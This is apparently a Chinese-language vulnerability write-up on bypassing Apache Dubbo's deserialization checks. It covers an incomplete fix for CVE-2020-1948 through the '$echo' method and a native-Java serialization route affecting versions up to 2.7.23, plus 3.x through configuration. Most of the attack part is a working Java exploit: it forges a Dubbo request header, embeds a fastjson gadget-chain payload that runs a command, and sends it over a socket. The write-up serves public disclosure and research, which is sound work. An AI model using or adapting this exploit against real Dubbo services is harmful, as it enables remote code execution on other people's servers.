# Dubbo Bypass deserialization checks

## 0x01 第一次尝试

在复现 Dubbo 历史漏洞时，发现 CVE-2020-11995 即对 CVE-2020-1948 的修复不完全，`$echo` 仍然存在利用方式，后续版本因为引入了 Hessian 黑名单将该问题很好的隐藏了，但是仍存在原生反序列化的利用方式，并且影响版本  <=2.7.23，如果修改配置后会影响到所有版本，上报给 Dubbo 后并不接受认为这是应该交由用户管理的安全问题，所以将该利用公开。

![dubbo](attachments/dubbo.gif)

## 0x02 分析

在 2.7.8 这个版本中，通过修改 `org.apache.dubbo.rpc.support.RpcUtils#isEcho()` 这个方法对 CVE-2020-1948 进行了修复，但是该判断并不严格

![image-20240206112813014](attachments/image-20240206112813014.png)

仍然可以接受来自用户的 Object 对象，因此可以构建如下 payload 实现利用。不过在 Dubbo 2.7.14 版本中修改了 `com.alibaba.com.caucho.hessian.io.ClassFactory` 这个类，在 `readObject()` 时通过黑名单的方式限制了 Hessian 反序列化，以至于该问题被似乎合理的隐藏掉了。

```
oos.writeUTF("0.0.0");
oos.writeUTF("org.example.api.DemoService");
oos.writeUTF("0.0.0");
oos.writeUTF("$echo");
oos.writeUTF("Ljava/lang/Object;");
oos.writeObject(payload);
oos.writeObject(new HashMap());
oos.flushBuffer();
```

![image-20240206112408859](attachments/image-20240206112408859.png)

![image-20240206112344405](attachments/image-20240206112344405.png)

## 0x03 pwned <=2.7.23

而更进一步也不是什么秘密，既然是 Hessian 的黑名单，修改 `header[2]` 指定为 Java 反序列化的方式就可以实现利用，在 2.x 版本中对于这种方式并没有安全验证。

```java
public static void main(String[] args) throws Exception {
    Object o = GadgetBuilder.fastjson("open -a Calculator.app");

    // header.
    byte[] header = new byte[16];

    // set magic number.
    Bytes.short2bytes((short) 0xdabb, header);

    // set request and serialization flag.
    // 2 -> "hessian2"
    // 3 -> "java"
    // 4 -> "compactedjava"
    // 6 -> "fastjson"
    // 7 -> "nativejava"
    // 8 -> "kryo"
    // 9 -> "fst"
    // 10 -> "native-hessian"
    // 11 -> "avro"
    // 12 -> "protostuff"
    // 16 -> "gson"
    // 21 -> "protobuf-json"
    // 22 -> "protobuf"
    // 25 -> "kryo2"
    header[2] = (byte) (0x80 | 3 | 0x40);

    // set request id.
    Bytes.long2bytes(new Random().nextInt(100000000), header, 4);

    ByteArrayOutputStream baos = new ByteArrayOutputStream();
    ObjectOutputStream oos = new ObjectOutputStream(baos);
    /* For Requests, we need to encode the following objects
          1.dubboVersion
          2.path
          3.version
          4.methodName
          5.methodDesc
          6.paramsObject
          7.map
        */
    oos.writeInt(666);
    oos.writeUTF("0.0.0");
    oos.writeInt(666);
    oos.writeUTF("org.example.api.DemoService");
    oos.writeInt(666);
    oos.writeUTF("0.0.0");
    oos.writeInt(666);
    oos.writeUTF("$echo");
    oos.writeInt(666);
    oos.writeUTF("Ljava/lang/Object;");
    oos.writeByte(666);
    oos.writeObject(o);
    oos.close();

    Bytes.int2bytes(baos.size(), header, 12);

    ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
    byteArrayOutputStream.write(header);
    byteArrayOutputStream.write(baos.toByteArray());
    byte[] bytes = byteArrayOutputStream.toByteArray();
    
    Socket socket = new Socket("127.0.0.1", 12345);
    OutputStream outputStream = socket.getOutputStream();
    outputStream.write(bytes);
    outputStream.flush();
    outputStream.close();
}
```

这个问题在 3.x 以上版本被修复，默认开启了 `SERIALIZATION_SECURITY_CHECK_KEY` 检查，这个方法还有一个被忽略的作用 `org.apache.dubbo.remoting.transport.CodecSupport#checkSerialization()` 会检测序列化 id，因为我们构造的是 java 与默认的 hessian 不匹配所以没法利用。

![image-20240225105722921](attachments/image-20240225105722921.png)

![image-20240225085038020](attachments/image-20240225085038020.png)

## 0x04 修改配置文件实现 3.x 版本的利用

我们继续看一下 `org.apache.dubbo.common.URL#getParameter()` 这个方法做了什么，首先通过 `org.apache.dubbo.common.url.component.param.DynamicParamTable#getKeyIndex()` 获取 `keyIndex` 当获取为 null 时会直接从 `EXTRA_PARAMS` 中获取。 `EXTRA_PARAMS` 我们是知道的，在 spring 项目中可以通过配置文件设置 `dubbo.provider.serialization=java`，所以实现在 3.x 版本中的利用。

![image-20240225105423195](attachments/image-20240225105423195.png)

但是这种方式的利用并不被 Dubbo 认可，Dubbo 官方认为用户主动启用 java 反序列化这种方式后，安全问题应该交由用户来处理





